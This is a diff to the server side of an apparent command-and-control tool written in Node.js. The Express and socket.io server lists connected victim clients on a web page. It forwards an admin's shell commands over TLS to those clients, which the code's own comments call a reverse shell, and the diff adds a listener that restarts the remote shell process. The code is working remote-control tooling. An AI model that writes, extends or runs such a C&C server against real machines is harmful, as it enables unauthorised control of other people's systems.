@@ -23,6 +23,7 @@ const options = {
     cert: fs.readFileSync('server-cert/public-cert.pem')
 }
 
+// Static paths for views & Partials
 const publicDirectoryPath = path.join(__dirname, './public')
 const viewsPath = path.join(__dirname, './templates/views')
 const partialsPath = path.join(__dirname, './templates/partials')
@@ -76,16 +77,19 @@ const app = express()
 const httpServer = http.createServer(app)
 const io = socketio(httpServer)
 
+// Setup HBS and paths for HBS
 app.set('view engine', 'hbs')
 app.set('views', viewsPath)
 hbs.registerPartials(partialsPath)
 
+// Setup express public static path
 app.use(express.static(publicDirectoryPath))
 
 // Default express route that displays all connected clients on the home page
 app.get('', (req, res) => {
     let clientList = []
     
+
     Object.keys(clients).forEach((key) => {
         clientList.push(key)
     })
@@ -96,12 +100,14 @@ app.get('', (req, res) => {
     })
 })
 
+// Render the client page which connects the admin to the Reverse Shell
 app.get('/client', (req,res) => {
     res.render('client', {
         client: req.query.id
     })
 })
 
+// Catchall Render for any 404 Pages.
 app.get('*', (req,res) => {
     res.send('404 Not found...')
 })
@@ -111,20 +117,29 @@ app.get('*', (req,res) => {
  */
 io.on('connection', (socket) => {
     console.log('new socketio connection')
-    // recieve from ioclient the tls key and add to ioclients stack
 
+    // recieve from ioclient the tls key and add to ioclients stack
     socket.on('bind', (tlsSockId) => {
         ioclients[tlsSockId] = socket
-        // console.log(ioclients)
     })
 
+    // Reset listener incase the shell child process on the clientV2 needs to be killed and restarted
+    socket.on('rst', (tlsSockId) => {
+        client = clients[tlsSockId]
+        if(client) {
+            client.write('2')
+        }
+    })
+
+    // Command listener to send shell commands to the client socket to execute
     socket.on('cmd', (data) => {
         console.log(`running: ${JSON.stringify(data)}`)
         client = clients[data.clientId]
         if (client) {
+            // '0' is indicator for command function (check clientV2)
             client.write('0' + data.shellInput+'\n')
-            //client.write('0' + data.shellInput.substr(0))
         } else {
+            // If tlsSocket and socketIO are not bound (i.e. client is not found)
             socket.emit('cmdRes', 'Requested client could not be found')
         }
     })
@@ -136,6 +151,7 @@ io.on('connection', (socket) => {
 server.listen(2222, () => {
     console.log('C&C Socket is live on port 2222')
 
+    // CLI functionality. May depricate soon
     prompt(clients)
 })
 
